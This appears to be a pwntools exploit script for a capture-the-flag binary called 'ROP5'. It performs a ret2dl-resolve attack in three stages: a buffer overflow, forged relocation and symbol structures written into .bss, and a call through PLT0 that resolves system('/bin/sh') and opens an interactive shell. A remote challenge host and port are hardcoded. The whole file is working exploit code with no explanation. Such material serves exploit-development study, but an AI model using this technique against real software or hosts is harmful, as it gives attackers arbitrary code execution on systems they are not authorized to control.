#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="i386", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./ROP5')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 20700)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./ROP5', checksec=False)
got_read = elf.got['read']
plt_read = elf.plt['read']
addr_main = 0x804855C
addr_bss = elf.bss(0x100)

addr_rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr  # .rel.plt
addr_dynsym = elf.get_section_by_name('.dynsym').header.sh_addr    # .dynsym
addr_dynstr = elf.get_section_by_name('.dynstr').header.sh_addr    # .dynstr
addr_plt_0 = elf.get_section_by_name('.plt').header.sh_addr        # .plt

dl_indexbase = addr_bss - addr_rel_plt
dl_index_dynsym = (addr_bss + 0xc - addr_dynsym) / 0x10
dl_r_info = (dl_index_dynsym << 8) | 7
dl_st_name = addr_bss + 0x18 - addr_dynstr

# gdb.attach(p, "b *0x804855A\nc\nc" + "\nsi" * 15 + "\nni" + "\nsi" * 16)
pd = 'a' * 0x48
pd += p32(plt_read)
pd += p32(addr_main)
pd += p32(0)
pd += p32(addr_bss)
pd += p32(0x200)
p.sendlineafter('Are you the LEVEL5?\n', pd)
sleep(1)

success('dl_indexbase    = ' + hex(dl_indexbase))
success('dl_index_dynsym = ' + hex(dl_index_dynsym))
success('dl_r_info       = ' + hex(dl_r_info))
success('dl_st_name      = ' + hex(dl_st_name))

pd = p32(got_read)
pd += p32(dl_r_info)
pd += p32(dl_st_name)
pd += p32(0) * 2
pd += p32(12)
pd += 'system\x00\x00'
pd += '/bin/sh\x00'
p.sendline(pd)
sleep(2)

pd = 'a' * 0x48
pd += p32(addr_plt_0)
pd += p32(dl_indexbase)
pd += p32(addr_main)
pd += p32(addr_bss + 8 * 4)
p.sendline(pd)
sleep(1)
p.sendline("exec 1>&0")
p.interactive()
